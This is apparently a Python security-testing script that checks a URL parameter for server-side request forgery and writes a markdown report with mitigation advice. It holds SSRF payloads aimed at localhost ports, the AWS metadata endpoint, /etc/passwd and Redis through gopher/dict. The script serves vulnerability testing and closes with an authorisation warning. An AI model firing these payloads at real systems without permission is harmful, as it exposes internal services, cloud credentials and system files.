#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Tester
Tests for SSRF vulnerabilities.
"""

import sys
import requests
from typing import List

class SSRFTester:
    def __init__(self, url: str):
        self.url = url
        self.payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://127.0.0.1:22',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'gopher://127.0.0.1:6379',
            'dict://127.0.0.1:6379'
        ]
        self.vulnerable = False
    
    def test_ssrf(self, param: str) -> bool:
        """Test for SSRF vulnerability"""
        print(f"[*] Testing {self.url} for SSRF...")
        
        for payload in self.payloads:
            try:
                response = requests.get(
                    self.url,
                    params={param: payload},
                    timeout=5,
                    allow_redirects=False
                )
                
                # Check for localhost/127.0.0.1 responses
                if '127.0.0.1' in response.text or 'localhost' in response.text:
                    print(f"[+] Potential SSRF vulnerability detected with: {payload}")
                    self.vulnerable = True
                    return True
            except:
                pass
        
        return False
    
    def generate_report(self) -> str:
        """Generate SSRF test report"""
        report = f"# SSRF Test Report for {self.url}\n\n"
        
        if self.vulnerable:
            report += "⚠️ **VULNERABLE**: SSRF vulnerability detected!\n\n"
        else:
            report += "✅ No SSRF vulnerability detected.\n\n"
        
        report += "## Tested Payloads\n\n"
        for i, payload in enumerate(self.payloads, 1):
            report += f"{i}. `{payload}`\n"
        report += "\n"
        
        report += "## Recommendations\n\n"
        report += "1. Whitelist allowed URLs/domains\n"
        report += "2. Block private IP ranges (127.0.0.1, 10.0.0.0/8, etc.)\n"
        report += "3. Use URL parsing libraries carefully\n"
        report += "4. Implement network segmentation\n\n"
        
        return report

def main():
    if len(sys.argv) < 3:
        print("Usage: python ssrf_tester.py <url> <parameter>")
        print("Example: python ssrf_tester.py http://example.com/fetch url")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    tester = SSRFTester(url)
    tester.test_ssrf(param)
    
    report = tester.generate_report()
    
    filename = "ssrf_test_report.md"
    with open(filename, 'w') as f:
        f.write(report)
    
    print(f"[+] SSRF testing complete")
    print(f"[+] Report saved to {filename}")
    print(f"[!] WARNING: Only test applications you own or have permission to test!")

if __name__ == '__main__':
    main()

